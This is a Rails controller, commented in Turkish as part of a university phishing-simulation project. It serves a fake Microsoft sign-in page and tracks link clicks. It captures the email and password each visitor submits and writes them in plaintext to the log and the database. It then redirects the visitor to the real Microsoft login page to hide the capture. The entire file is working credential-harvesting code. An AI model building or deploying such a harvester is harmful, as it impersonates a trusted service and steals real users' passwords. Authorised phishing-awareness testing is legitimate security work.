# -----------------------------------------------------------------------------
# AuthController — main.py + auth.html'in Rails karşılığı.
# Sahte Microsoft login sayfasını render eder, credential'ı DB'ye yazar ve
# gerçek login.microsoftonline.com'a yönlendirir.
#
# UYARI: Bu kod sadece Kadir Has Üniversitesi bitirme projesi kapsamındaki
# kontrollü phishing simülasyonu için kullanılmak üzere tasarlanmıştır.
# -----------------------------------------------------------------------------
class AuthController < ApplicationController
  skip_forgery_protection only: :login
  layout "blank"

  def show
    @target = params[:token].present? ? Target.find_by(token: params[:token]) : nil

    # Link tıklandı → event kaydet
    if @target && (campaign = Campaign.recent.first)
      EmailEvent.create!(
        campaign: campaign,
        target: @target,
        event_type: "clicked",
        ip_address: request.remote_ip,
        user_agent: request.user_agent
      )
      campaign.increment!(:links_clicked)
    end
  end

  def login
    email    = params[:loginfmt]
    password = params[:passwd]

    Rails.logger.info "[+] CREDENTIAL CAPTURED: #{email} | #{password}"

    target   = Target.find_by(email: email)
    campaign = Campaign.recent.first

    Credential.create!(
      campaign: campaign,
      target: target,
      email: email,
      password: password,
      ip_address: request.remote_ip,
      user_agent: request.user_agent
    )

    if campaign
      EmailEvent.create!(
        campaign: campaign,
        target: target,
        event_type: "submitted",
        ip_address: request.remote_ip,
        user_agent: request.user_agent
      ) if target
      campaign.increment!(:creds_captured)
    end

    # main.py'deki meta-refresh + JS redirect davranışı
    render inline: <<~HTML.html_safe, layout: false
      <html>
        <head>
          <meta http-equiv="refresh" content="0;url=https://login.microsoftonline.com/" />
        </head>
        <body>
          <script>window.location.href = "https://login.microsoftonline.com/";</script>
        </body>
      </html>
    HTML
  end
end
